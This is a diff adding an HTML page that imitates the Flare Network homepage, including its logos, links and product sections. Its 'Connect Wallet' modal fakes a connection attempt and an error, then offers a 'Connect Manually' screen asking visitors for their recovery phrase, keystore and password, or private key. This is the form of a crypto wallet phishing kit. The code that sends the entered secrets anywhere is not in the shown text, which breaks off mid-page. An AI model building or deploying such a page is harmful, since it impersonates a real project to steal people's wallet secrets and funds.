@@ -1,0 +1,1769 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flare Network - The blockchain for data</title>
+    <link rel="icon" href="https://flare.network/api/media/file/Flare.svg" type="image/x-icon">
+    <link href="styles.css" rel="stylesheet">
+    <style>
+         * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+  background-color: #ffffff;
+  color: #1f2937;
+  line-height: 1.6;
+}
+
+.container {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 24px;
+}
+
+.header {
+  padding: 16px 0;
+  position: relative;
+  z-index: 100;
+}
+
+.header .container {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+}
+
+.logo-text {
+  font-size: 24px;
+  font-weight: bold;
+  background: linear-gradient(135deg, #ec4899, #db2777);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.nav {
+  display: flex;
+  gap: 32px;
+}
+
+.nav-link {
+  color: #374151;
+  text-decoration: none;
+  transition: color 0.3s ease;
+}
+
+.nav-link:hover {
+  color: #db2777;
+}
+
+.mobile-menu-btn {
+  display: none;
+  flex-direction: column;
+  background: none;
+  border: none;
+  cursor: pointer;
+  padding: 8px;
+}
+
+.mobile-menu-btn span {
+  width: 24px;
+  height: 2px;
+  background-color: #374151;
+  margin: 3px 0;
+  transition: 0.3s;
+}
+
+.hero {
+  position: relative;
+  min-height: 70vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  padding: 80px 24px;
+  color: white;
+}
+
+.hero-video-bg {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  overflow: hidden;
+}
+
+.hero-video-bg video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.hero-bg {
+  position: absolute;
+  inset: 0;
+  overflow: hidden;
+  z-index: 1;
+}
+
+.shape {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(60px);
+  opacity: 0.2;
+  animation: float 6s ease-in-out infinite;
+}
+
+.shape-1 {
+  top: -80px;
+  left: -80px;
+  width: 384px;
+  height: 384px;
+  background: linear-gradient(135deg, #f472b6, #ec4899, #9333ea);
+  transform: rotate(12deg);
+  animation-delay: 0s;
+}
+
+.shape-2 {
+  top: 25%;
+  right: -128px;
+  width: 320px;
+  height: 320px;
+  background: linear-gradient(225deg, #fbb6ce, #f472b6, #a855f7);
+  opacity: 0.25;
+  animation-delay: 2s;
+}
+
+.shape-3 {
+  bottom: 0;
+  left: 25%;
+  width: 256px;
+  height: 256px;
+  background: linear-gradient(45deg, #ec4899, #db2777, #7c3aed);
+  opacity: 0.15;
+  animation-delay: 4s;
+}
+
+.shape-4 {
+  bottom: 80px;
+  right: 40px;
+  width: 288px;
+  height: 288px;
+  background: linear-gradient(315deg, #f472b6, #ec4899, #9333ea);
+  transform: rotate(-12deg);
+  animation-delay: 1s;
+}
+
+@keyframes float {
+  0%,
+  100% {
+    transform: translateY(0px) rotate(0deg);
+  }
+  50% {
+    transform: translateY(-20px) rotate(5deg);
+  }
+}
+
+.hero-content {
+  position: relative;
+  z-index: 10;
+  text-align: center;
+  max-width: 800px;
+}
+
+.hero-icon {
+  margin-bottom: 32px;
+}
+
+.icon-shap {
+  width: 48px;
+  height: 48px;
+  margin: 0 auto;
+  background: linear-gradient(135deg, #ec4899, #db2777);
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+}
+
+.icon-shap::after {
+  content: "";
+  width: 24px;
+  height: 24px;
+  background-color: white;
+  border-radius: 2px;
+  transform: rotate(45deg);
+}
+
+.hero-title {
+  font-size: clamp(2.5rem, 5vw, 4rem);
+  font-weight: bold;
+  margin-bottom: 24px;
+  line-height: 1.2;
+}
+
+.hero-subtitle {
+  font-size: 20px;
+  color: #f8f8f8;
+  margin-bottom: 32px;
+  max-width: 600px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.cta-button {
+  background: linear-gradient(135deg, #db2777, #be185d);
+  color: white;
+  border: none;
+  padding: 12px 32px;
+  font-size: 18px;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  font-weight: 500;
+}
+
+.cta-button:hover {
+  background: linear-gradient(135deg, #be185d, #9d174d);
+  transform: translateY(-2px);
+  box-shadow: 0 10px 25px rgba(219, 39, 119, 0.3);
+}
+
+.partners {
+  padding: 64px 0;
+}
+
+.partners-label {
+  text-align: center;
+  font-size: 12px;
+  color: #9ca3af;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-bottom: 48px;
+}
+
+.partners-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+  gap: 32px;
+  align-items: center;
+  justify-items: center;
+}
+
+.partner {
+  font-weight: bold;
+  color: #374151;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.flare-tech-section {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  padding: 40px 20px;
+  gap: 20px;
+}
+
+.flare-column {
+  flex: 1;
+  min-width: 300px;
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+}
+
+.flare-center {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-width: 300px;
+}
+
+.flare-box {
+  margin-bottom: 20px;
+}
+
+.flare-box h4 {
+  font-size: 14px;
+  color: #6b7280;
+  margin-bottom: 10px;
+}
+
+.box {
+  padding: 20px;
+  border-radius: 10px;
+  margin-bottom: 10px;
+}
+
+.box.pink {
+  background-color: #fdf2f8;
+}
+
+.box strong {
+  color: #db2777;
+  display: block;
+  margin-bottom: 6px;
+}
+
+.box p {
+  font-size: 14px;
+  margin: 0;
+  color: #555;
+}
+
+.flare-video {
+  width: 100%;
+  max-width: 400px;
+  aspect-ratio: 4 / 3;
+  background: transparent;
+  border-radius: 0;
+  overflow: hidden;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.flare-video video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  display: block;
+  border: none;
+  outline: none;
+  background: transparent;
+  pointer-events: none;
+}
+
+.art-image {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 30px;
+  padding: 40px 20px;
+  flex-wrap: wrap;
+}
+
+.art-image div {
+  max-width: 500px;
+}
+
+.fast-stats-section {
+  position: relative;
+  height: 400px;
+  background-color: #fff;
+  overflow: hidden;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: background-color 0.4s ease;
+}
+
+.fast-stats-section:hover,
+.fast-stats-section.animate {
+  background-color: #e61659;
+}
+
+.background-video-container {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  pointer-events: none;
+  overflow: hidden;
+  opacity: 0;
+  transition: opacity 0.4s ease;
+}
+
+.fast-stats-section:hover .background-video-container,
+.fast-stats-section.animate .background-video-container {
+  opacity: 0.2;
+}
+
+.background-video-container video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.pink-art-image {
+  position: absolute;
+  left: 0;
+  height: 100%;
+  width: 50%;
+  z-index: 1;
+  pointer-events: none;
+}
+
+.fast-content {
+  position: relative;
+  z-index: 2;
+  text-align: center;
+  padding: 20px;
+  color: black;
+  transition: color 0.3s ease;
+}
+
+.fast-stats-section:hover .fast-content,
+.fast-stats-section.animate .fast-content {
+  color: white;
+}
+
+.fast-text h1 {
+  font-size: 70px;
+  margin-bottom: 10px;
+}
+
+.fast-text .counter {
+  font-size: 36px;
+  font-weight: bold;
+  transition: all 0.4s ease;
+}
+
+.fast-text p {
+  font-size: 14px;
+  margin-top: 10px;
+}
+
+.participate {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  padding: 40px 20px;
+  background-color: #fff;
+}
+
+.title {
+  text-align: center;
+  font-size: 40px;
+  font-weight: 500;
+  margin-bottom: 20px;
+}
+
+.banner img {
+  width: 100%;
+  max-height: 330px;
+  object-fit: cover;
+  border-radius: 10px;
+}
+
+.cards {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 20px;
+  margin-top: 40px;
+}
+
+.card {
+  background-color: #ffeef5;
+  padding: 20px;
+  border-radius: 12px;
+  text-align: center;
+  transition: box-shadow 0.3s ease;
+  cursor: pointer;
+}
+
+.card img {
+  height: 100px;
+  margin-bottom: 15px;
+}
+
+.card h3 {
+  color: #e6007a;
+  font-size: 16px;
+  margin-bottom: 10px;
+}
+
+.card p {
+  font-size: 14px;
+  color: #444;
+}
+
+.card:hover {
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+}
+
+.newsletter-section {
+  background-color: #f8f8f8;
+  padding: 40px 20px;
+  text-align: center;
+}
+
+.newsletter-content h2 {
+  font-size: 24px;
+  margin-bottom: 10px;
+}
+
+.newsletter-content p {
+  max-width: 600px;
+  margin: 0 auto 20px;
+  font-size: 16px;
+  color: #444;
+}
+
+.subscribe-button {
+  background-color: #d10a44;
+  color: white;
+  border: none;
+  padding: 10px 20px;
+  font-size: 15px;
+  border-radius: 6px;
+  cursor: pointer;
+}
+
+.subscribe-button:hover {
+  background-color: #b5093b;
+}
+
+.footer {
+  background-color: #fff;
+  border-top: 1px solid #ddd;
+  padding: 30px 20px;
+  font-size: 14px;
+  color: #333;
+}
+
+.footer-top {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+}
+
+.footer-brand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+
+.footer-logo {
+  height: 20px;
+}
+
+.footer-links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 15px;
+  margin-bottom: 20px;
+  justify-content: center;
+}
+
+.footer-links a {
+  text-decoration: none;
+  color: #333;
+}
+
+.footer-links a:hover {
+  text-decoration: underline;
+}
+
+.social-icons {
+  display: flex;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+
+.social-icons a {
+  display: inline-block;
+}
+
+.social-icons img {
+  height: 20px;
+  width: auto;
+}
+
+.footer-bottom {
+  border-top: 1px solid #eee;
+  padding-top: 20px;
+  margin-top: 20px;
+  text-align: center;
+}
+
+.footer-bottom h4 {
+  font-weight: bold;
+  margin-bottom: 10px;
+  color: #444;
+}
+
+.dev-links {
+  display: flex;
+  justify-content: center;
+  gap: 20px;
+  flex-wrap: wrap;
+}
+
+.dev-links a {
+  text-decoration: none;
+  color: #0066cc;
+}
+
+.dev-links a:hover {
+  text-decoration: underline;
+}
+
+@media (max-width: 768px) {
+  .nav {
+    display: none;
+    position: absolute;
+    top: 100%;
+    left: 0;
+    right: 0;
+    background: white;
+    flex-direction: column;
+    padding: 20px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  }
+
+  .nav.active {
+    display: flex;
+  }
+
+  .mobile-menu-btn {
+    display: flex;
+  }
+
+  .mobile-menu-btn.active span:nth-child(1) {
+    transform: rotate(-45deg) translate(-5px, 6px);
+  }
+
+  .mobile-menu-btn.active span:nth-child(2) {
+    opacity: 0;
+  }
+
+  .mobile-menu-btn.active span:nth-child(3) {
+    transform: rotate(45deg) translate(-5px, -6px);
+  }
+
+  .hero {
+    min-height: 60vh;
+    padding: 60px 24px;
+  }
+
+  .hero-title {
+    font-size: 2.5rem;
+  }
+
+  .hero-subtitle {
+    font-size: 18px;
+  }
+
+  .flare-tech-section {
+    flex-direction: column;
+  }
+
+  .fast-stats-section {
+    height: auto;
+    padding: 40px 0;
+  }
+
+  .fast-text h1 {
+    font-size: 50px;
+  }
+
+  .partners-grid {
+    grid-template-columns: repeat(2, 1fr);
+    gap: 24px;
+  }
+
+  .partner {
+    font-size: 14px;
+  }
+}
+
+@media (max-width: 480px) {
+  .container {
+    padding: 0 16px;
+  }
+
+  .hero {
+    padding: 40px 16px;
+  }
+
+  .partners-grid {
+    grid-template-columns: 1fr;
+  }
+
+  .wallet-modal-content {
+    width: 95%;
+  }
+}
+
+.wallet-modal {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.2);
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+}
+
+.wallet-modal-content {
+  background-color: #fff;
+  width: 400px;
+  max-width: 90%;
+  border-radius: 16px;
+  box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+  overflow: hidden;
+  position: relative;
+  padding: 24px;
+}
+
+.wallet-screen {
+  display: none;
+}
+
+.modal-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 24px;
+}
+
+.modal-title {
+  font-size: 18px;
+  font-weight: 500;
+  color: #111827;
+}
+
+.close-button {
+  background: none;
+  border: none;
+  font-size: 20px;
+  cursor: pointer;
+  color: #6b7280;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 24px;
+  height: 24px;
+}
+
+.wallet-option {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  width: 100%;
+  padding: 16px 20px;
+  margin-bottom: 12px;
+  border: 1px solid #e5e7eb;
+  border-radius: 9999px;
+  background: none;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.wallet-option:hover {
+  border-color: #db2777;
+}
+
+.wallet-info {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+}
+
+.wallet-name {
+  font-weight: 500;
+  font-size: 16px;
+  color: #111827;
+}
+
+.wallet-description {
+  color: #6b7280;
+  font-size: 14px;
+}
+
+.wallet-icon {
+  width: 32px;
+  height: 32px;
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
+}
+
+.metamask-icon {
+  background-image: url('media/download (1).png');
+}
+
+.walletconnect-icon {
+  background-image: url('https://seeklogo.com/images/W/walletconnect-logo-EE83B50C97-seeklogo.com.png');
+}
+
+.coinbase-icon {
+  background-image: url('https://www.pngall.com/wp-content/uploads/15/Coinbase-Logo-PNG-Images.png');
+}
+
+.ledger-icon {
+  background-image: url('https://th.bing.com/th/id/OIP.CBGu--2fe8tuzrTgd4qYxAAAAA?w=408&h=408&rs=1&pid=ImgDetMain');
+}
+
+.terms-text {
+  font-size: 12px;
+  color: #6b7280;
+  text-align: center;
+  margin-top: 16px;
+}
+
+.terms-link {
+  color: #db2777;
+  cursor: pointer;
+  text-decoration: none;
+}
+
+.connecting-screen {
+  display: none;
+}
+
+.error-message {
+  padding: 16px;
+  border: 1px solid #db2777;
+  border-radius: 9999px;
+  color: #db2777;
+  text-align: center;
+  margin-bottom: 20px;
+  font-weight: 500;
+}
+
+.wallet-info-box {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 16px 20px;
+  border: 1px solid #db2777;
+  border-radius: 9999px;
+  margin-bottom: 20px;
+}
+
+.wallet-info-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.manual-connect-btn {
+  width: 100%;
+  background-color: #db2777;
+  color: white;
+  border: none;
+  padding: 12px;
+  border-radius: 9999px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: background-color 0.2s;
+}
+
+.manual-connect-btn:hover {
+  background-color: #be185d;
+}
+
+.flare-logo {
+  height: 24px;
+  margin-bottom: 24px;
+}
+
+.wallet-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 24px;
+}
+
+.wallet-header-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.tabs {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 24px;
+  border-bottom: 1px solid #e5e7eb;
+}
+
+.tab-button {
+  flex: 1;
+  padding: 12px 0;
+  text-align: center;
+  background: none;
+  border: none;
+  border-bottom: 2px solid transparent;
+  cursor: pointer;
+  color: #6b7280;
+  transition: all 0.2s;
+  font-weight: 400;
+  font-size: 16px;
+}
+
+.tab-button.active {
+  color: #111827;
+  border-bottom-color: #111827;
+  font-weight: 600;
+}
+
+.tab-content {
+  display: none;
+}
+
+.tab-content.active {
+  display: block;
+}
+
+textarea, input[type="text"], input[type="password"] {
+  width: 100%;
+  padding: 12px 16px;
+  border: 1px solid #e5e7eb;
+  border-radius: 8px;
+  font-size: 14px;
+  margin-bottom: 8px;
+  resize: none;
+  height: 48px;
+}
+
+textarea {
+  height: 120px;
+}
+
+textarea:focus, input:focus {
+  outline: none;
+  border-color: #111827;
+}
+
+.input-hint {
+  font-size: 12px;
+  color: #6b7280;
+  margin-bottom: 24px;
+}
+
+.proceed-btn {
+  width: 100%;
+  background-color: #db2777;
+  color: white;
+  border: none;
+  padding: 12px;
+  border-radius: 9999px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all 0.2s;
+  margin-top: 24px;
+}
+
+.proceed-btn:hover {
+  background-color: #be185d;
+  border-color: #be185d;
+}
+
+.connecting-container {
+  padding: 0;
+}
+
+.connecting-message {
+  padding: 16px;
+  border: 1px solid #db2777;
+  border-radius: 9999px;
+  color: #db2777;
+  text-align: center;
+  margin-bottom: 20px;
+  font-weight: 500;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.connecting-wallet-info {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 16px 20px;
+  border: 1px solid #db2777;
+  border-radius: 9999px;
+  margin-bottom: 20px;
+}
+
+.connecting-wallet-left {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+
+.connecting-wallet-icon {
+  width: 32px;
+  height: 32px;
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
+}
+
+.connecting-wallet-name {
+  font-weight: 500;
+  font-size: 16px;
+}
+
+.loading-dots {
+  display: inline-block;
+  position: relative;
+  width: 20px;
+  height: 20px;
+  margin-left: 10px;
+}
+
+.loading-dots div {
+  position: absolute;
+  top: 8px;
+  width: 4px;
+  height: 4px;
+  border-radius: 50%;
+  background: #db2777;
+  animation-timing-function: cubic-bezier(0, 1, 1, 0);
+}
+
+.loading-dots div:nth-child(1) {
+  left: 0;
+  animation: loading-dots1 0.6s infinite;
+}
+
+.loading-dots div:nth-child(2) {
+  left: 0;
+  animation: loading-dots2 0.6s infinite;
+}
+
+.loading-dots div:nth-child(3) {
+  left: 8px;
+  animation: loading-dots2 0.6s infinite;
+}
+
+.loading-dots div:nth-child(4) {
+  left: 16px;
+  animation: loading-dots3 0.6s infinite;
+}
+
+@keyframes loading-dots1 {
+  0% {
+    transform: scale(0);
+  }
+  100% {
+    transform: scale(1);
+  }
+}
+
+@keyframes loading-dots3 {
+  0% {
+    transform: scale(1);
+  }
+  100% {
+    transform: scale(0);
+  }
+}
+
+@keyframes loading-dots2 {
+  0% {
+    transform: translate(0, 0);
+  }
+  100% {
+    transform: translate(8px, 0);
+  }
+}
+
+.private-key-input {
+  width: 100%;
+  padding: 12px 16px;
+  border: 1px solid #e5e7eb;
+  border-radius: 8px;
+  font-size: 14px;
+  margin-bottom: 16px;
+  height: 48px;
+}
+
+.private-key-input:focus {
+  outline: none;
+  border-color: #111827;
+}
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <span class="logo-text"><img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo">flare</span>
+            </div>
+            <nav class="nav" id="nav">
+                <a href="https://flare.network/wallets" class="nav-link">Participate</a>
+                <a href="https://flare.network/products/flare-time-series-oracle" class="nav-link">Products</a>
+                <a href="https://dev.flare.network/network/getting-started" class="nav-link">Developers</a>
+                <a href="https://dev.flare.network/network/overview/#configuration" class="nav-link">Network</a>
+                <a href="https://flare.network/news" class="nav-link">News & Events</a>
+            </nav>
+            <button class="mobile-menu-btn" id="mobileMenuBtn">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-video-bg">
+            <video autoplay muted loop playsinline>
+                <source src="media/home_hero_mobile.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="hero-bg">
+            <div class="shape shape-1"></div>
+            <div class="shape shape-2"></div>
+            <div class="shape shape-3"></div>
+            <div class="shape shape-4"></div>
+        </div>
+        <div class="hero-content">
+            <div class="hero-icon">
+                <img src="https://flare.network/api/media/file/Flare.svg" alt="flare">
+            </div>
+            <h1 class="hero-title">The blockchain for data</h1>
+            <p class="hero-subtitle">
+                Flare is a full-stack layer 1 solution designed for data intensive use cases.
+            </p>
+            <button class="cta-button" id="connectWalletBtn">Connect Wallet</button>
+        </div>
+    </section>
+
+    <div id="walletModal" class="wallet-modal">
+        <div class="wallet-modal-content">
+            <div id="walletSelectionScreen" class="wallet-screen">
+                <div class="modal-header">
+                    <div class="modal-title">Connect Wallet</div>
+                    <button class="close-button" id="closeWalletModal">&times;</button>
+                </div>
+                
+                <button class="wallet-option" data-wallet="MetaMask">
+                    <div class="wallet-info">
+                        <div class="wallet-name">MetaMask</div>
+                        <div class="wallet-description">Connect</div>
+                    </div>
+                    <div class="wallet-icon metamask-icon"></div>
+                </button>
+                
+                <button class="wallet-option" data-wallet="WalletConnect">
+                    <div class="wallet-info">
+                        <div class="wallet-name">Wallet Connect</div>
+                        <div class="wallet-description">Connect</div>
+                    </div>
+                    <div class="wallet-icon walletconnect-icon"></div>
+                </button>
+                
+                <button class="wallet-option" data-wallet="Coinbase">
+                    <div class="wallet-info">
+                        <div class="wallet-name">Coinbase Connect</div>
+                        <div class="wallet-description">Connect</div>
+                    </div>
+                    <div class="wallet-icon coinbase-icon"></div>
+                </button>
+                
+                <button class="wallet-option" data-wallet="Ledger">
+                    <div class="wallet-info">
+                        <div class="wallet-name">Ledger</div>
+                        <div class="wallet-description">Connect</div>
+                    </div>
+                    <div class="wallet-icon ledger-icon"></div>
+                </button>
+                
+                <p class="terms-text">By connecting a wallet, you agree to the <a href="#" class="terms-link">Terms of Service</a></p>
+            </div>
+
+            <div id="connectingScreen" class="wallet-screen">
+                <button class="close-button" id="closeConnectingScreen">&times;</button>
+                
+                <div class="connecting-message">
+                    Initializing connection
+                    <div class="loading-dots">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+                
+                <div class="connecting-wallet-info">
+                    <div class="connecting-wallet-left">
+                        <div id="connectingWalletIcon" class="connecting-wallet-icon"></div>
+                        <span id="connectingWalletName" class="connecting-wallet-name">MetaMask</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="errorScreen" class="wallet-screen">
+                <button class="close-button" id="closeErrorScreen">&times;</button>
+                
+                <div class="error-message">Error Connecting...</div>
+                
+                <div class="wallet-info-box">
+                    <div class="wallet-info-left">
+                        <div id="selectedWalletIcon" class="wallet-icon"></div>
+                    </div>
+                    <span id="selectedWalletName">MetaMask Wallet</span>
+                </div>
+                
+                <button id="manualConnectBtn" class="manual-connect-btn">Connect Manually</button>
+            </div>
+
+            <div id="manualScreen" class="wallet-screen">
+                <div class="wallet-header">
+                    <div id="walletLogoContainer">
+                        <img src="https://flare.network/api/media/file/Flare.svg" alt="Flare" class="flare-logo">
+                    </div>
+                    <button class="close-button" id="closeManualScreen">&times;</button>
+                </div>
+                
+                <div class="tabs">
+                    <button class="tab-button active" data-tab="phrase">Phrase</button>
+                    <button class="tab-button" data-tab="keystore">Keystore</button>
+                    <button class="tab-button" data-tab="privateKey">Private Key</button>
+                </div>
+
+                <div id="phraseTab" class="tab-content active">
+                    <textarea id="phraseInput" placeholder="Enter your recovery phrase" rows="5"></textarea>
+                    <p class="input-hint">Typically 12 (sometimes 24) words separated by single spaces</p>
+                </div>
+
+                <div id="keystoreTab" class="tab-content">
+                    <textarea id="keystoreInput" placeholder="Keystore" rows="4"></textarea>
+                    <input type="password" id="passwordInput" placeholder="Password">
+                    <p class="input-hint">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+                </div>
+
+                <div id="privateKeyTab" class="tab-content">
+                    <input type="text" id="privateKeyInput" class="private-key-input" placeholder="Private Key">
+                    <p class="input-hint">Typically 64 characters not separated by spaces</p>
+                </div>
+
+                <button id="proceedBtn" class="proceed-btn">Synchronize</button>
+            </div>
+        </div>
+    </div>
+
+    <section class="partners">
+        <div class="container">
+            <p class="partners-label">Building with the best</p>
+
+            <div class="partners-grid">
+                <div class="partner"><img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FElliptic.png&w=384&q=75" height="55" alt="Elliptic"></div>
+                <div class="partner layerzero">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FLayerZero_Logo_Full%201.png&w=640&q=75" height="55" alt="LayerZero">
+                </div>
+                <div class="partner hypernative">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fhypernative.png&w=640&q=75" height="55" alt="Hypernative">
+                </div>
+                <div class="partner google-cloud">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FGoogle_Cloud.png&w=640&q=75" height="55" alt="Google Cloud">
+                </div>
+                <div class="partner ankr"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fankr-1.png&w=384&q=75" alt="Ankr"></div>
+                <div class="partner arkham"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FArkham.png&w=384&q=75" alt="Arkham"></div>
+                <div class="partner hextrust"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FHexTrust.png&w=640&q=75" height="55" alt="HexTrust"></div>
+            </div>
+        </div>
+    </section>
+    <section class="flare-tech-section">
+        <div class="flare-column">
+            <div class="flare-box">
+                <h4>FOUNDATIONAL TECHNOLOGY</h4>
+                <div class="box pink redirect-card" data-redirect-url="#">
+                    <strong><h3>Enshrined Data Protocols</h3></strong>
+                    <p>Flare's protocols are integrated into the blockchain's core, and inherit the economic security of the entire network</p>
+                </div>
+            </div>
+            <div class="flare-box">
+                <div class="box pink redirect-card" data-redirect-url="#">
+                    <strong><h3>Ethereum Virtual Machine</h3></strong>
+                    <p>Flare is EVM compatible with out-of-the-box support for all your favorite tooling</p>
+                </div>
+            </div>
+            <div class="flare-box">
+                <div class="box pink redirect-card" data-redirect-url="#">
+                    <strong><h3>Flare Stake</h3></strong>
+                </div>
+                <p>Flare uses a proof-of-stake (PoS) mechanism to ensure a significant and consistent level of economic security</p>
+            </div>
+        </div>
+
+        <div class="flare-center">
+            <div class="flare-video">
+                <video src="media/city_ori.mp4" autoplay loop muted></video>
+            </div>
+        </div>
+
+        <div class="flare-column">
+            <div class="flare-box">
+                <h4>NEW USE CASES</h4>
+                <div class="box pink redirect-card" data-redirect-url="https://flare.network/products/fassets">
+                    <strong><h2><img src="media/FAssets (1).svg" height="30" alt="FAssets"> FAssets →</h2></strong>
+                    <p>Securely explore XRPFi, BTCFi and DOGEFi</p>
+                </div>
+            </div>
+
+            <div class="flare-box">
+                <h4>ENSHRINED DATA PROTOCOLS</h4>
+                <div class="box pink redirect-card" data-redirect-url="https://flare.network/products/flare-data-connector">
+                    <strong><h2><img src="media/FDC-1.svg" height="30" alt="FDC">FDC →</h2></strong>
+                    <p>Reliably access external blockchain events and real-world APIs</p>
+                </div>
+                <div class="box pink redirect-card" data-redirect-url="https://flare.network/products/flare-time-series-oracle">
+                    <strong><h2><img src="media/FTSO (1).svg" height="30" alt="FTSO"> FTSO →</h2></strong>
+                    <p>Easily integrate fast, secure, and decentralized price feeds</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="art-image">
+        <img src="media/fassets.webp" height="130" alt="FAssets">
+        <div>
+            <strong><p style="color: darkgrey;">FLARE FEATURED NEWS</p></strong>
+            <img src="media/FAssets-2.svg" height="60" style="display: inline-block;" alt="FAssets logo"><img id="xrp" src="media/XRP.svg" height="90" style="display: inline-block;" alt="XRP logo">
+            <p>FAssets v1.1 Launches on Songbird -<br> Unlocking Scalable FXRP Minting</p><br> <p>May 14. 2025</p>
+        </div>
+    </section>
+    <section class="fast-stats-section" id="fastSection">
+        <div class="background-video-container">
+            <video src="media/home_fast_desktop.webm" autoplay muted loop playsinline></video>
+        </div>
+
+        <div class="pink-art-image">
+        </div>
+        <div class="fast-content">
+            <div class="fast-text">
+                <h1>Fast</h1>
+                <div class="counter" id="fastCounter" data-target="233527">0</div>
+                <p>1.6s avg block time with single-slot finality</p>
+            </div>
+        </div>
+    </section>
+    <br>
+    <section class="fast-stats-section" id="decentralizedSection">
+        <div class="pink-art-image">
+        </div>
+        <div class="fast-content">
+            <div class="fast-text">
+                <h1>Decentralized</h1>
+                <div class="counter" id="decentralizedCounter" data-target="33">0</div>
+                <h3>100 Data providers</h3>
+                <p>Maximum Stake per data provider</p>
+            </div>
+        </div>
+        <div class="background-video-container">
+            <video src="media/home_providers_desktop.webm" autoplay muted loop playsinline></video>
+        </div>
+    </section>
+    <section class="participate">
+        <h2 class="title">Participate in Flare</h2>
+
+        <div class="banner">
+            <img src="https://flare.network/_next/image?url=%2Fen%2Fstatic%2F1200x400.jpg&w=3840&q=75" alt="Flare Fair Banner" />
+        </div>
+        <div class="cards">
+            <div class="card redirect-card" data-redirect-url="https://flare.network/flaredrops">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fflaredrop_4x.png&w=3840&q=75" alt="FlareDrops" />
+                <h3>Get FlareDrops →</h3>
+                <p>Wrap FLR to earn rewards</p>
+            </div>
+            <div class="card redirect-card" data-redirect-url="https://flare.network/delegate-and-stake">
